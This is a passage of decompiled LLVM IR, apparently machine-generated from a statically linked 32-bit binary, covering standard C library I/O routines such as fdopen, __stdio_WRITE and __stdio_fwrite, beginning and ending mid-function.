  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80612af

dec_label_pc_8061295:                             ; preds = %dec_label_pc_80612c0
  %v1_8061295 = call i32 @__errno_location(i32 %v0_806126b)
  store i32 %v1_8061295, i32* %eax.global-to-local, align 4
  %v1_806129a = inttoptr i32 %v1_8061295 to i32*
  store i32 84, i32* %v1_806129a, align 4
  br label %dec_label_pc_80612e6

dec_label_pc_80612a5:                             ; preds = %dec_label_pc_80612c7
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_80612db.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80612d7

dec_label_pc_80612a9:                             ; preds = %dec_label_pc_806127f
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_80612ab = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80612ab, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80612af

dec_label_pc_80612af:                             ; preds = %dec_label_pc_806127f, %dec_label_pc_806128a, %dec_label_pc_80612a9
  %v2_80612c716 = phi i32 [ %v4_806126f, %dec_label_pc_806127f ], [ %v2_806128c, %dec_label_pc_806128a ], [ %v2_80612ab, %dec_label_pc_80612a9 ]
  %v0_80612b7 = phi i32 [ %arg4, %dec_label_pc_806127f ], [ -1, %dec_label_pc_806128a ], [ %arg4, %dec_label_pc_80612a9 ]
  %tmp = icmp ult i32 %v0_80612b7, %arg3
  br i1 %tmp, label %dec_label_pc_80612b7, label %dec_label_pc_80612b9

dec_label_pc_80612b7:                             ; preds = %dec_label_pc_80612af
  br label %dec_label_pc_80612b9

dec_label_pc_80612b9:                             ; preds = %dec_label_pc_80612af, %dec_label_pc_80612b7
  %storemerge32 = phi i32 [ %v0_80612b7, %dec_label_pc_80612b7 ], [ %arg3, %dec_label_pc_80612af ]
  %v0_80612bc = phi i32 [ %v0_80612b7, %dec_label_pc_80612b7 ], [ %arg3, %dec_label_pc_80612af ]
  store i32 %storemerge32, i32* %ebx.global-to-local, align 4
  %v1_80612b9 = inttoptr i32 %arg2 to i32*
  %v2_80612b9 = load i32, i32* %v1_80612b9, align 4
  store i32 %v2_80612b9, i32* %esi.global-to-local, align 4
  store i32 %v0_80612bc, i32* @ecx, align 4
  %v1_80612d34 = icmp eq i32 %v0_80612bc, 0
  %v1_80612d511 = icmp eq i1 %v1_80612d34, false
  br i1 %v1_80612d511, label %dec_label_pc_80612c0, label %dec_label_pc_80612d7

dec_label_pc_80612c0:                             ; preds = %dec_label_pc_80612b9, %dec_label_pc_80612cd
  %v2_80612c7 = phi i32 [ %v2_80612d0, %dec_label_pc_80612cd ], [ %v2_80612c716, %dec_label_pc_80612b9 ]
  %v0_80612c0 = phi i32 [ %v1_80612cd, %dec_label_pc_80612cd ], [ %v2_80612b9, %dec_label_pc_80612b9 ]
  %v1_80612c0 = inttoptr i32 %v0_80612c0 to i32*
  %v2_80612c0 = load i32, i32* %v1_80612c0, align 4
  store i32 %v2_80612c0, i32* %eax.global-to-local, align 4
  %v6_80612c5 = icmp ugt i32 %v2_80612c0, 127
  br i1 %v6_80612c5, label %dec_label_pc_8061295, label %dec_label_pc_80612c7

dec_label_pc_80612c7:                             ; preds = %dec_label_pc_80612c0
  %v1_80612c7 = trunc i32 %v2_80612c0 to i8
  %v3_80612c7 = inttoptr i32 %v2_80612c7 to i8*
  store i8 %v1_80612c7, i8* %v3_80612c7, align 1
  %v0_80612c9 = load i32, i32* %eax.global-to-local, align 4
  %v3_80612c9 = trunc i32 %v0_80612c9 to i8
  %v4_80612c9 = icmp eq i8 %v3_80612c9, 0
  br i1 %v4_80612c9, label %dec_label_pc_80612a5, label %dec_label_pc_80612cd

dec_label_pc_80612cd:                             ; preds = %dec_label_pc_80612c7
  %v0_80612cd = load i32, i32* %esi.global-to-local, align 4
  %v1_80612cd = add i32 %v0_80612cd, 4
  store i32 %v1_80612cd, i32* %esi.global-to-local, align 4
  %v0_80612d0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80612d0 = load i32, i32* %edi.global-to-local, align 4
  %v2_80612d0 = add i32 %v1_80612d0, %v0_80612d0
  store i32 %v2_80612d0, i32* %edx.global-to-local, align 4
  %v0_80612d2 = load i32, i32* @ecx, align 4
  %v1_80612d2 = add i32 %v0_80612d2, -1
  %v8_80612d2 = icmp eq i32 %v1_80612d2, 0
  store i32 %v1_80612d2, i32* @ecx, align 4
  %v1_80612d5 = icmp eq i1 %v8_80612d2, false
  br i1 %v1_80612d5, label %dec_label_pc_80612c0, label %dec_label_pc_80612d7

dec_label_pc_80612d7:                             ; preds = %dec_label_pc_80612cd, %dec_label_pc_80612b9, %dec_label_pc_80612a5
  %v0_80612df = phi i32 [ 0, %dec_label_pc_80612a5 ], [ %v2_80612b9, %dec_label_pc_80612b9 ], [ %v1_80612cd, %dec_label_pc_80612cd ]
  %v0_80612db = phi i32 [ %v0_80612db.pre, %dec_label_pc_80612a5 ], [ %v2_80612c716, %dec_label_pc_80612b9 ], [ %v2_80612d0, %dec_label_pc_80612cd ]
  %v2_80612d7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80612d7, i32* %eax.global-to-local, align 4
  %v12_80612db = icmp eq i32 %v0_80612db, %v2_80612d7
  br i1 %v12_80612db, label %dec_label_pc_80612e2, label %dec_label_pc_80612df

dec_label_pc_80612df:                             ; preds = %dec_label_pc_80612d7
  %v1_80612df = load i32, i32* %ebp.global-to-local, align 4
  %v2_80612df = inttoptr i32 %v1_80612df to i32*
  store i32 %v0_80612df, i32* %v2_80612df, align 4
  br label %dec_label_pc_80612e2

dec_label_pc_80612e2:                             ; preds = %dec_label_pc_80612d7, %dec_label_pc_80612df
  %v0_80612e2 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80612e2, i32* %eax.global-to-local, align 4
  %v1_80612e4 = load i32, i32* @ecx, align 4
  %v2_80612e4 = sub i32 %v0_80612e2, %v1_80612e4
  br label %dec_label_pc_80612e6

dec_label_pc_80612e6:                             ; preds = %dec_label_pc_8061295, %dec_label_pc_80612e2
  %storemerge2 = phi i32 [ -1, %dec_label_pc_8061295 ], [ %v2_80612e4, %dec_label_pc_80612e2 ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  store i32 %v0_806126b, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v2_80612d0, { 0, 2, 1 }
  uselistorder i32 %v1_80612cd, { 0, 2, 1 }
  uselistorder i32 %v2_80612b9, { 1, 0, 2 }
  uselistorder i32 %v0_80612bc, { 1, 0 }
  uselistorder i32 %v2_80612c716, { 1, 0 }
  uselistorder i32 %v4_806126f, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 6, 2, 3, 7, 4, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80612e6, { 1, 0 }
  uselistorder label %dec_label_pc_80612e2, { 1, 0 }
  uselistorder label %dec_label_pc_80612c0, { 1, 0 }
  uselistorder label %dec_label_pc_80612b9, { 1, 0 }
  uselistorder label %dec_label_pc_80612af, { 2, 1, 0 }
}

define i32 @fdopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80612f0 = load i32, i32* @ebx, align 4
  store i32 %v0_80612f0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80612fb = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 %tmp11)
  store i32 %v3_80612fb, i32* @eax, align 4
  %v10_8061305 = icmp eq i32 %v3_80612fb, -1
  br i1 %v10_8061305, label %dec_label_pc_806131c, label %dec_label_pc_806130a

dec_label_pc_806130a:                             ; preds = %entry
  %v0_806130a = load i32, i32* @ebx, align 4
  %v4_8061312 = inttoptr i32 %arg2 to i8*
  %v5_8061312 = call i32 @_stdio_fopen(i32 %v3_80612fb, i8* %v4_8061312, i32 0, i32 %v0_806130a)
  br label %dec_label_pc_806131c

dec_label_pc_806131c:                             ; preds = %entry, %dec_label_pc_806130a
  %v0_806131c = phi i32 [ 0, %entry ], [ %v5_8061312, %dec_label_pc_806130a ]
  %v2_8061320 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061320, i32* @ebx, align 4
  ret i32 %v0_806131c

; uselistorder directives
  uselistorder i32 %v3_80612fb, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 3, 0, 1, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_806131c, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8061324 = load i32, i32* @ebp, align 4
  %v0_8061325 = load i32, i32* @edi, align 4
  %v0_8061326 = load i32, i32* @esi, align 4
  %v0_8061327 = load i32, i32* @ebx, align 4
  %v4_806132b = ptrtoint i16* %arg1 to i32
  store i32 %v4_806132b, i32* @edi, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80613375 = icmp eq i32 %arg3, 0
  br i1 %v1_80613375, label %dec_label_pc_8061396, label %dec_label_pc_806133c.lr.ph

dec_label_pc_806133c.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_806133c

dec_label_pc_806133c:                             ; preds = %dec_label_pc_806135b.dec_label_pc_806133c_crit_edge, %dec_label_pc_806133c.lr.ph
  %v0_806134c = phi i32 [ %v4_806132b, %dec_label_pc_806133c.lr.ph ], [ %v0_806134c.pre, %dec_label_pc_806135b.dec_label_pc_806133c_crit_edge ]
  %v0_806134b = phi i32 [ %arg2, %dec_label_pc_806133c.lr.ph ], [ %v2_806135d, %dec_label_pc_806135b.dec_label_pc_806133c_crit_edge ]
  %v0_806133e.in = phi i32 [ %arg3, %dec_label_pc_806133c.lr.ph ], [ %v2_806135b, %dec_label_pc_806135b.dec_label_pc_806133c_crit_edge ]
  %v0_806133e = icmp slt i32 %v0_806133e.in, 0
  store i32 %v0_806133e.in, i32* @ebp, align 4
  %v2_806133e = icmp eq i1 %v0_806133e, false
  %storemerge = select i1 %v2_806133e, i32 %v0_806133e.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_806134c = add i32 %v0_806134c, 4
  %v2_806134c = inttoptr i32 %v1_806134c to i32*
  %v3_806134c = load i32, i32* %v2_806134c, align 4
  %v4_806134f = call i32 @__libc_write(i32 %v3_806134c, i32 %v0_806134b, i32 %storemerge)
  store i32 %v4_806134f, i32* %eax.global-to-local, align 4
  %v2_8061357 = icmp slt i32 %v4_806134f, 0
  br i1 %v2_8061357, label %dec_label_pc_8061361, label %dec_label_pc_806135b

dec_label_pc_806135b:                             ; preds = %dec_label_pc_806133c
  %v0_806135b = load i32, i32* @ebx, align 4
  %v2_806135b = sub i32 %v0_806135b, %v4_806134f
  %v12_806135b = icmp eq i32 %v2_806135b, 0
  store i32 %v2_806135b, i32* @ebx, align 4
  %v0_806135d = load i32, i32* @esi, align 4
  %v2_806135d = add i32 %v0_806135d, %v4_806134f
  store i32 %v2_806135d, i32* @esi, align 4
  br i1 %v12_806135b, label %dec_label_pc_8061396, label %dec_label_pc_806135b.dec_label_pc_806133c_crit_edge

dec_label_pc_806135b.dec_label_pc_806133c_crit_edge: ; preds = %dec_label_pc_806135b
  %v0_806134c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_806133c

dec_label_pc_8061361:                             ; preds = %dec_label_pc_806133c
  %v0_8061361 = load i32, i32* @edi, align 4
  %v1_8061361 = add i32 %v0_8061361, 8
  %v2_8061361 = inttoptr i32 %v1_8061361 to i32*
  %v3_8061361 = load i32, i32* %v2_8061361, align 4
  store i32 %v3_8061361, i32* @edx, align 4
  %v1_8061364 = add i32 %v0_8061361, 12
  %v2_8061364 = inttoptr i32 %v1_8061364 to i32*
  %v3_8061364 = load i32, i32* %v2_8061364, align 4
  store i32 %v3_8061364, i32* %eax.global-to-local, align 4
  %v1_8061367 = inttoptr i32 %v0_8061361 to i16*
  %v2_8061367 = load i16, i16* %v1_8061367, align 2
  %v3_8061367 = or i16 %v2_8061367, 8
  store i16 %v3_8061367, i16* %v1_8061367, align 2
  %v0_806136b = load i32, i32* %eax.global-to-local, align 4
  %v1_806136b = load i32, i32* @edx, align 4
  %v2_806136b = sub i32 %v0_806136b, %v1_806136b
  %v12_806136b = icmp eq i32 %v2_806136b, 0
  store i32 %v2_806136b, i32* %eax.global-to-local, align 4
  %v4_8061392.pre = load i32, i32* @ebx, align 4
  br i1 %v12_806136b, label %dec_label_pc_8061392, label %dec_label_pc_806136f

dec_label_pc_806136f:                             ; preds = %dec_label_pc_8061361
  %v6_8061371 = icmp ugt i32 %v2_806136b, %v4_8061392.pre
  br i1 %v6_8061371, label %dec_label_pc_8061375.preheader, label %dec_label_pc_8061373

dec_label_pc_8061373:                             ; preds = %dec_label_pc_806136f
  store i32 %v2_806136b, i32* @ebp, align 4
  br label %dec_label_pc_8061375.preheader

dec_label_pc_8061375.preheader:                   ; preds = %dec_label_pc_8061373, %dec_label_pc_806136f
  %v0_8061375.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8061375

dec_label_pc_8061375:                             ; preds = %dec_label_pc_8061375.preheader, %dec_label_pc_8061387
  %v2_8061377 = phi i32 [ %v1_806136b, %dec_label_pc_8061375.preheader ], [ %v1_8061383, %dec_label_pc_8061387 ]
  %v4_8061375 = phi i32 [ %v2_806136b, %dec_label_pc_8061375.preheader ], [ %v0_8061379, %dec_label_pc_8061387 ]
  %v0_8061375 = phi i32 [ %v0_8061375.pre, %dec_label_pc_8061375.preheader ], [ %v1_8061387, %dec_label_pc_8061387 ]
  %v1_8061375 = inttoptr i32 %v0_8061375 to i8*
  %v2_8061375 = load i8, i8* %v1_8061375, align 1
  %v3_8061375 = zext i8 %v2_8061375 to i32
  %v5_8061375 = and i32 %v4_8061375, -256
  %v6_8061375 = or i32 %v3_8061375, %v5_8061375
  store i32 %v6_8061375, i32* %eax.global-to-local, align 4
  %v3_8061377 = inttoptr i32 %v2_8061377 to i8*
  store i8 %v2_8061375, i8* %v3_8061377, align 1
  %v0_8061379 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061379 = trunc i32 %v0_8061379 to i8
  %v10_8061379 = icmp eq i8 %v1_8061379, 10
  %v1_806137b = icmp eq i1 %v10_8061379, false
  br i1 %v1_806137b, label %dec_label_pc_8061383, label %dec_label_pc_806137d

dec_label_pc_806137d:                             ; preds = %dec_label_pc_8061375
  %v0_806137d = load i32, i32* @edi, align 4
  %v1_806137d = add i32 %v0_806137d, 1
  %v2_806137d = inttoptr i32 %v1_806137d to i8*
  %v3_806137d = load i8, i8* %v2_806137d, align 1
  %v4_806137d = urem i8 %v3_806137d, 2
  %v5_806137d = icmp eq i8 %v4_806137d, 0
  %v1_8061381 = icmp eq i1 %v5_806137d, false
  br i1 %v1_8061381, label %dec_label_pc_806137d.dec_label_pc_806138a_crit_edge, label %dec_label_pc_8061383

dec_label_pc_806137d.dec_label_pc_806138a_crit_edge: ; preds = %dec_label_pc_806137d
  %v0_806138a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_806138a

dec_label_pc_8061383:                             ; preds = %dec_label_pc_806137d, %dec_label_pc_8061375
  %v0_8061383 = load i32, i32* @edx, align 4
  %v1_8061383 = add i32 %v0_8061383, 1
  store i32 %v1_8061383, i32* @edx, align 4
  %v0_8061384 = load i32, i32* @ebp, align 4
  %v1_8061384 = add i32 %v0_8061384, -1
  %v8_8061384 = icmp eq i32 %v1_8061384, 0
  store i32 %v1_8061384, i32* @ebp, align 4
  br i1 %v8_8061384, label %dec_label_pc_8061383.dec_label_pc_806138a_crit_edge, label %dec_label_pc_8061387

dec_label_pc_8061383.dec_label_pc_806138a_crit_edge: ; preds = %dec_label_pc_8061383
  %v1_806138a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_806138a

dec_label_pc_8061387:                             ; preds = %dec_label_pc_8061383
  %v0_8061387 = load i32, i32* @esi, align 4
  %v1_8061387 = add i32 %v0_8061387, 1
  store i32 %v1_8061387, i32* @esi, align 4
  br label %dec_label_pc_8061375

dec_label_pc_806138a:                             ; preds = %dec_label_pc_8061383.dec_label_pc_806138a_crit_edge, %dec_label_pc_806137d.dec_label_pc_806138a_crit_edge
  %v1_806138a = phi i32 [ %v0_806137d, %dec_label_pc_806137d.dec_label_pc_806138a_crit_edge ], [ %v1_806138a.pre, %dec_label_pc_8061383.dec_label_pc_806138a_crit_edge ]
  %v0_806138a = phi i32 [ %v0_806138a.pre, %dec_label_pc_806137d.dec_label_pc_806138a_crit_edge ], [ %v1_8061383, %dec_label_pc_8061383.dec_label_pc_806138a_crit_edge ]
  %v2_806138a = add i32 %v1_806138a, 16
  %v3_806138a = inttoptr i32 %v2_806138a to i32*
  store i32 %v0_806138a, i32* %v3_806138a, align 4
  %v0_806138d = load i32, i32* @edx, align 4
  %v1_806138d = load i32, i32* @edi, align 4
  %v2_806138d = add i32 %v1_806138d, 8
  %v3_806138d = inttoptr i32 %v2_806138d to i32*
  %v4_806138d = load i32, i32* %v3_806138d, align 4
  %v5_806138d = sub i32 %v0_806138d, %v4_806138d
  store i32 %v5_806138d, i32* @edx, align 4
  %v0_8061390 = load i32, i32* @ebx, align 4
  %v2_8061390 = sub i32 %v0_8061390, %v5_806138d
  br label %dec_label_pc_8061392

dec_label_pc_8061392:                             ; preds = %dec_label_pc_8061361, %dec_label_pc_806138a
  %v4_8061392 = phi i32 [ %v2_8061390, %dec_label_pc_806138a ], [ %v4_8061392.pre, %dec_label_pc_8061361 ]
  %v5_8061392 = sub i32 %arg3, %v4_8061392
  br label %dec_label_pc_8061396

dec_label_pc_8061396:                             ; preds = %dec_label_pc_806135b, %entry, %dec_label_pc_8061392
  %stack_var_12.0 = phi i32 [ %v5_8061392, %dec_label_pc_8061392 ], [ 0, %entry ], [ %arg3, %dec_label_pc_806135b ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_8061327, i32* @ebx, align 4
  store i32 %v0_8061326, i32* @esi, align 4
  store i32 %v0_8061325, i32* @edi, align 4
  store i32 %v0_8061324, i32* @ebp, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8061387, { 1, 0 }
  uselistorder i32 %v1_8061384, { 1, 0 }
  uselistorder i32 %v1_8061383, { 0, 2, 1 }
  uselistorder i32 %v0_8061379, { 1, 0 }
  uselistorder i32 %v2_806135d, { 1, 0 }
  uselistorder i32 %v2_806135b, { 1, 2, 0 }
  uselistorder i32 %v4_806134f, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_write, { 2, 11, 10, 9, 1, 0, 5, 4, 8, 3, 7, 12, 6 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8061396, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061392, { 1, 0 }
  uselistorder label %dec_label_pc_8061375, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80613a4 = load i32, i32* @ebp, align 4
  %v0_80613a5 = load i32, i32* @edi, align 4
  %v0_80613a6 = load i32, i32* @esi, align 4
  %v0_80613a7 = load i32, i32* @ebx, align 4
  store i32 %v0_80613a7, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_80613b7 = add i32 %arg3, 1
  %v2_80613b7 = inttoptr i32 %v1_80613b7 to i8*
  %v3_80613b7 = load i8, i8* %v2_80613b7, align 1
  %v4_80613b7 = and i8 %v3_80613b7, 2
  %v5_80613b7 = icmp eq i8 %v4_80613b7, 0
  %v1_80613bb = icmp eq i1 %v5_80613b7, false
  br i1 %v1_80613bb, label %dec_label_pc_8061472, label %dec_label_pc_80613c1

dec_label_pc_80613c1:                             ; preds = %entry
  %v1_80613c1 = add i32 %arg3, 4
  %v2_80613c1 = inttoptr i32 %v1_80613c1 to i32*
  %v3_80613c1 = load i32, i32* %v2_80613c1, align 4
  %v13_80613c1 = icmp eq i32 %v3_80613c1, -2
  %v1_80613c5 = add i32 %arg3, 16
  %v2_80613c5 = inttoptr i32 %v1_80613c5 to i32*
  %v3_80613c5 = load i32, i32* %v2_80613c5, align 4
  store i32 %v3_80613c5, i32* @edx, align 4
  %v1_80613c8 = add i32 %arg3, 12
  %v2_80613c8 = inttoptr i32 %v1_80613c8 to i32*
  %v3_80613c8 = load i32, i32* %v2_80613c8, align 4
  %v1_80613cb = icmp eq i1 %v13_80613c1, false
  %v2_80613eb = sub i32 %v3_80613c8, %v3_80613c5
  store i32 %v2_80613eb, i32* %eax.global-to-local, align 4
  br i1 %v1_80613cb, label %dec_label_pc_80613eb, label %dec_label_pc_80613cd

dec_label_pc_80613cd:                             ; preds = %dec_label_pc_80613c1
  %tmp = icmp ult i32 %v2_80613eb, %arg2
  br i1 %tmp, label %dec_label_pc_80613d5, label %dec_label_pc_80613d7

dec_label_pc_80613d5:                             ; preds = %dec_label_pc_80613cd
  br label %dec_label_pc_80613d7

dec_label_pc_80613d7:                             ; preds = %dec_label_pc_80613cd, %dec_label_pc_80613d5
  %storemerge = phi i32 [ %v2_80613eb, %dec_label_pc_80613d5 ], [ %arg2, %dec_label_pc_80613cd ]
  %v0_80613d8 = phi i32 [ %v2_80613eb, %dec_label_pc_80613d5 ], [ %arg2, %dec_label_pc_80613cd ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_80613db = inttoptr i32 %v3_80613c5 to i16*
  %v4_80613db = call i32 @memcpy(i16* %v3_80613db, i32 %v0_80613d8, i32 %v2_80613eb)
  store i32 %v4_80613db, i32* %eax.global-to-local, align 4
  %v0_80613e0 = load i32, i32* @ebx, align 4
  %v1_80613e0 = add i32 %v0_80613e0, 16
  %v2_80613e0 = inttoptr i32 %v1_80613e0 to i32*
  %v3_80613e0 = load i32, i32* %v2_80613e0, align 4
  %v4_80613e0 = load i32, i32* @esi, align 4
  %v5_80613e0 = add i32 %v4_80613e0, %v3_80613e0
  store i32 %v5_80613e0, i32* %v2_80613e0, align 4
  br label %dec_label_pc_806148a

dec_label_pc_80613eb:                             ; preds = %dec_label_pc_80613c1
  %v6_80613ef = icmp ult i32 %v2_80613eb, %arg2
  br i1 %v6_80613ef, label %dec_label_pc_8061459, label %dec_label_pc_80613f1

dec_label_pc_80613f1:                             ; preds = %dec_label_pc_80613eb
  %v0_80613f1 = load i32, i32* @ecx, align 4
  %v3_80613f5 = inttoptr i32 %v3_80613c5 to i16*
  %v4_80613f5 = call i32 @memcpy(i16* %v3_80613f5, i32 %arg2, i32 %v0_80613f1)
  store i32 %v4_80613f5, i32* %eax.global-to-local, align 4
  %v0_80613fa = load i32, i32* @ebx, align 4
  %v1_80613fa = add i32 %v0_80613fa, 16
  %v2_80613fa = inttoptr i32 %v1_80613fa to i32*
  %v3_80613fa = load i32, i32* %v2_80613fa, align 4
  %v4_80613fa = load i32, i32* @edi, align 4
  %v5_80613fa = add i32 %v4_80613fa, %v3_80613fa
  store i32 %v5_80613fa, i32* %v2_80613fa, align 4
  %v0_8061400 = load i32, i32* @ebx, align 4
  %v1_8061400 = add i32 %v0_8061400, 1
  %v2_8061400 = inttoptr i32 %v1_8061400 to i8*
  %v3_8061400 = load i8, i8* %v2_8061400, align 1
  %v4_8061400 = urem i8 %v3_8061400, 2
  %v5_8061400 = icmp eq i8 %v4_8061400, 0
  br i1 %v5_8061400, label %dec_label_pc_806148a, label %dec_label_pc_806140a

dec_label_pc_806140a:                             ; preds = %dec_label_pc_80613f1
  %v0_806140a = load i32, i32* @edx, align 4
  %v0_806140b = load i32, i32* @edi, align 4
  %v4_806140f = call i32 @memrchr(i8 10, i32 %v0_806140b, i32 %v0_806140a)
  store i32 %v4_806140f, i32* %eax.global-to-local, align 4
  %v1_8061417 = icmp eq i32 %v4_806140f, 0
  br i1 %v1_8061417, label %dec_label_pc_806148a, label %dec_label_pc_806141b

dec_label_pc_806141b:                             ; preds = %dec_label_pc_806140a
  %v0_806141e = load i32, i32* @ebx, align 4
  %v1_806141f = call i32 @__stdio_wcommit(i32 %v0_806141e)
  store i32 %v1_806141f, i32* %eax.global-to-local, align 4
  %v1_8061427 = icmp eq i32 %v1_806141f, 0
  br i1 %v1_8061427, label %dec_label_pc_806148a, label %dec_label_pc_806142b

dec_label_pc_806142b:                             ; preds = %dec_label_pc_806141b
  %v0_806142b = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_806142b, %v1_806141f
  br i1 %tmp23, label %dec_label_pc_8061431, label %dec_label_pc_8061433

dec_label_pc_8061431:                             ; preds = %dec_label_pc_806142b
  br label %dec_label_pc_8061433

dec_label_pc_8061433:                             ; preds = %dec_label_pc_806142b, %dec_label_pc_8061431
  %storemerge22 = phi i32 [ %v1_806141f, %dec_label_pc_8061431 ], [ %v0_806142b, %dec_label_pc_806142b ]
  %v0_806143a = phi i32 [ %v1_806141f, %dec_label_pc_8061431 ], [ %v0_806142b, %dec_label_pc_806142b ]
  store i32 %storemerge22, i32* %esi.global-to-local, align 4
  %v2_8061435 = sub i32 %v0_806142b, %v0_806143a
  store i32 %v2_8061435, i32* %eax.global-to-local, align 4
  %v0_8061437 = load i32, i32* @ebp, align 4
  %v2_8061437 = add i32 %v0_8061437, %v2_8061435
  store i32 %v2_8061437, i32* %ebp.global-to-local, align 4
  %v4_806143e = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_806143a, i32 %v2_8061435)
  store i32 %v4_806143e, i32* %eax.global-to-local, align 4
  store i32 %v4_806143e, i32* @edx, align 4
  %v1_8061448 = icmp eq i32 %v4_806143e, 0
  br i1 %v1_8061448, label %dec_label_pc_806148a, label %dec_label_pc_806144c

dec_label_pc_806144c:                             ; preds = %dec_label_pc_8061433
  %v0_806144c = load i32, i32* %ebp.global-to-local, align 4
  %v1_806144c = load i32, i32* %esi.global-to-local, align 4
  %v2_806144c = sub i32 %v0_806144c, %v4_806143e
  %v2_8061450 = add i32 %v2_806144c, %v1_806144c
  store i32 %v2_8061450, i32* %eax.global-to-local, align 4
  %v0_8061452 = load i32, i32* @ebx, align 4
  %v1_8061452 = add i32 %v0_8061452, 16
  %v2_8061452 = inttoptr i32 %v1_8061452 to i32*
  %v3_8061452 = load i32, i32* %v2_8061452, align 4
  %v5_8061452 = sub i32 %v3_8061452, %v2_8061450
  store i32 %v5_8061452, i32* %v2_8061452, align 4
  %v0_8061455 = load i32, i32* @edi, align 4
  %v1_8061455 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061455 = sub i32 %v0_8061455, %v1_8061455
  store i32 %v2_8061455, i32* @edi, align 4
  br label %dec_label_pc_806148a

dec_label_pc_8061459:                             ; preds = %dec_label_pc_80613eb
  %v2_8061459 = add i32 %arg3, 8
  %v3_8061459 = inttoptr i32 %v2_8061459 to i32*
  %v4_8061459 = load i32, i32* %v3_8061459, align 4
  %v15_8061459 = icmp eq i32 %v3_80613c5, %v4_8061459
  br i1 %v15_8061459, label %dec_label_pc_8061472, label %dec_label_pc_806145e

dec_label_pc_806145e:                             ; preds = %dec_label_pc_8061459
  %v1_8061462 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8061462, i32* %eax.global-to-local, align 4
  %v1_806146a = icmp eq i32 %v1_8061462, 0
  br i1 %v1_806146a, label %dec_label_pc_806145e.dec_label_pc_8061472_crit_edge, label %dec_label_pc_806146e

dec_label_pc_806145e.dec_label_pc_8061472_crit_edge: ; preds = %dec_label_pc_806145e
  %v0_8061472.pre = load i32, i32* @edi, align 4
  %v0_806147a.pre = load i32, i32* @ebx, align 4
  %v2_8061481.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8061472

dec_label_pc_806146e:                             ; preds = %dec_label_pc_806145e
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_806148a

dec_label_pc_8061472:                             ; preds = %dec_label_pc_806145e.dec_label_pc_8061472_crit_edge, %dec_label_pc_8061459, %entry
  %v2_8061481 = phi i32 [ %v2_8061481.pre, %dec_label_pc_806145e.dec_label_pc_8061472_crit_edge ], [ %v0_80613a7, %dec_label_pc_8061459 ], [ %v0_80613a7, %entry ]
  %v0_806147a = phi i32 [ %v0_806147a.pre, %dec_label_pc_806145e.dec_label_pc_8061472_crit_edge ], [ %arg3, %dec_label_pc_8061459 ], [ %arg3, %entry ]
  %v0_8061472 = phi i32 [ %v0_8061472.pre, %dec_label_pc_806145e.dec_label_pc_8061472_crit_edge ], [ %arg2, %dec_label_pc_8061459 ], [ %arg2, %entry ]
  store i32 %v2_8061481, i32* @ebx, align 4
  store i32 %v0_80613a6, i32* @esi, align 4
  store i32 %v0_80613a5, i32* @edi, align 4
  store i32 %v0_80613a4, i32* @ebp, align 4
